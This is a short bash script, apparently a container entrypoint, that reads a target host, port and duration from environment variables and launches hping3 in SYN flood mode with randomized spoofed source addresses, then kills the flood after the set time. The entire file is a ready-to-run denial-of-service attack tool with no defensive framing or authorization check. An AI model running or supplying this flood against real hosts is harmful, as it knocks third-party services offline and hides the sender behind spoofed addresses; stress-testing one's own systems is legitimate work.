#!/bin/bash

_TARGET=$TARGET
_DURATION=$DURATION
_TARGET_PORT=$TARGET_PORT
_PACKET_SIZE=${PACKET_SIZE:-120}
_WINDOW_SIZE=${WINDOW_SIZE:-64}


[ -z $_TARGET ] && echo "\$TARGET env var missing: Target host must be set" && exit 1
[ -z $_DURATION ] && echo "\$DURATION env var missing: Flood duration must be set" && exit 1
[ -z $_TARGET_PORT ] && echo "\$TARGET_PORT env var missing: Target port must be set" && exit 1

echo "TARGET: $_TARGET"
echo "FLOOD DURATION: $_DURATION"
echo "PACKET SIZE: $_PACKET_SIZE"
echo "TCP WINDOW SIZE: $_WINDOW_SIZE"
echo "FLOOD TARGET PORT: $_TARGET_PORT"

hping3 -d $_PACKET_SIZE -S -w $_WINDOW_SIZE -p $_TARGET_PORT --flood --rand-source $_TARGET&

HPING_PID=$! 
sleep $_DURATION
kill -9 $HPING_PID
exit 0
